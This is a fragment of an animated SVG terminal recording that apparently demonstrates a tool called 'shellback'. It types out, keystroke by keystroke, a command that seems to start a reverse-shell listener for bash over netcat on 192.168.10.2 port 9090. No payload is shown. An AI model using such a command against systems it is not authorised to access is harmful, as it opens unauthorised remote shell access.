x="8526"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9</text></svg><svg x="8613"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">90</text></svg><svg x="8700"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">909</text></svg><svg x="8787"><use xlink:href="#a"/><use xlink:href="#42"/></svg><svg x="8874"><use xlink:href="#a"/><use xlink:href="#42"/></svg><svg x="8961"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-</text></svg><svg x="9048"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-v</text></svg><svg x="9135"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-v</text><text x="42.084" y="1.67" class="h">n</text></svg><svg x="9222"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-v</text><text x="42.084" y="1.67" class="h">nc</text></svg><svg x="9309"><use xlink:href="#a"/><use xlink:href="#43"/></svg><svg x="9396"><use xlink:href="#a"/><use xlink:href="#43"/></svg><svg x="9483"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-v</text><text x="42.084" y="1.67" class="h">nc2</text><text x="46.092" y="1.67" class="h">-</text></svg><svg x="9570"><use xlink:href="#a"/><use xlink:href="#44"/></svg><svg x="9657"><use xlink:href="#a"/><use xlink:href="#44"/></svg><svg x="9744"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-v</text><text x="42.084" y="1.67" class="h">nc2</text><text x="46.092" y="1.67" class="h">-u</text><text x="49.098" y="1.67" class="h">-</text></svg><svg x="9831"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-v</text><text x="42.084" y="1.67" class="h">nc2</text><text x="46.092" y="1.67" class="h">-u</text><text x="49.098" y="1.67" class="h">-c</text></svg><svg x="9918"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-v</text><text x="42.084" y="1.67" class="h">nc2</text><text x="46.092" y="1.67" class="h">-u</text><text x="49.098" y="1.67" class="h">-c</text><text x="52.104" y="1.67" class="h">-</text></svg><svg x="10005"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-v</text><text x="42.084" y="1.67" class="h">nc2</text><text x="46.092" y="1.67" class="h">-u</text><text x="49.098" y="1.67" class="h">-c</text><text x="52.104" y="1.67" class="h">-s</text></svg><svg x="10092"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-v</text><text x="42.084" y="1.67" class="h">nc2</text><text x="46.092" y="1.67" class="h">-u</text><text x="49.098" y="1.67" class="h">-c</text><text x="52.104" y="1.67" class="h">-s</text><text x="55.11" y="1.67" class="h">b</text></svg><svg x="10179"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-v</text><text x="42.084" y="1.67" class="h">nc2</text><text x="46.092" y="1.67" class="h">-u</text><text x="49.098" y="1.67" class="h">-c</text><text x="52.104" y="1.67" class="h">-s</text><text x="55.11" y="1.67" class="h">ba</text></svg><svg x="10266"><use xlink:href="#a"/><text y="1.67" class="f">➜</text><text x="3.006" y="1.67" class="g">~</text><text x="5.01" y="1.67" class="h">shellback</text><text x="15.03" y="1.67" class="h">-l</text><text x="18.036" y="1.67" class="h">192.168.10.2</text><text x="31.062" y="1.67" class="h">-p</text><text x="34.068" y="1.67" class="h">9090</text><text x="39.078" y="1.67" class="h">-v</text><text x="42.084" y="1.67" class="h">nc2</text><text x="46.092" y="1.67" class="h">-u</text><text x="49.098" y="1.67" class="h">-c</text><text x="52.104" y="1.67" class="h">-s</text><text x="55.11" y="1.67" class="h">bas</text></svg><svg x="10353"><use xlink:href="#a"/><use xlink:href="#45"/></svg><svg x="10440"><use xlink:href="#a"/><use xlink:href="#45"/></svg><svg x="10527"><use xlink:href="#a"/><use xlink:href="#45"/></svg><svg x="10614"><use xlink:href="#a"/><use xlink:href="#45"/></svg><svg x="10701"><use xlink:href="#a"/><use xlink:href="#45"/><use xlink:href="#46" y="2.171"/></svg><svg x="10788"><use xlink:href="#a"/><use xlink:href="#45"/><use xlink:href="#46" y="2.171"/><use xlink:href="#47" y="6.513"/><use xlink:href="#48" y="8.684"/><use xlink:href="#49" y="13.026"/></svg><svg x="10875"><use xlink:href="#a"/><use xlink:href="#45"/><use xlink:href="#46" y="2.171"/><use xlink:href="#47" y="6.513"/><use xlink:href="#48" y="8.684"/><use xlink:href="#49" y="13.026"/><use xlink:href="#50" y="15.197"/></svg><svg x="10962"><use xlink:href="#a"/><use xlink:href="#45"/><use xlink:href="#46" y="2.171"/><use xlink:href="#47" y="6.513"/><use xlink:href="#48" y="8.684"/><use xlink:href="#49" y="13.026"/><use xlink:href="#50" y="15.197"/></svg><svg x="11049"><use xlink:href="#a"/><use xlink:href="#45"/><use xlink:href="#46" y="2.171"/><use xlink:href="#47" y="6.513"/><use xlink:href="#48" y="8.684"/><use xlink:href="#49" y="13.026"/><use xlink:href="#50" y="15.197"/></svg><svg x="11136"><use xlink:href="#a"/><use xlink:href="#45"/><use xlink:href="#46" y="2.171"/><use xlink:href="#47" y="6.513"/><use xlink:href="#48" y="8.684"/><use xlink:href="#49" y="13.026"/><use xlink:href="#50" y="15.197"/><use xlink:href="#1" y="17.368"/></svg><svg x="11223"><use xlink:href="#a"/><use xlink:href="#45"/><use xlink:href="#46" y="2.171"/><use xlink:href="#47" y="6.513"/><use xlink:href="#48" y="8.684"/><use xlink:href="#49" y="13.026"/><use xlink:href="#50" y="15.197"/><use xlink:href="#1" y="17.368"/></svg><svg x="11310"><use xlink:href="#a"/><use xlink:href="#45"/><use xlink:href="#46" y="2.171"/><use xlink:href="#47" y="6.513"/><use xlink:href="#48" y="8.684"/><use xlink:href="#49" y="13.026"/><use xlink:href="#50" y="15.197"/><use xlink:href="#1" y="17.368"/></svg></svg></g></g></svg></svg>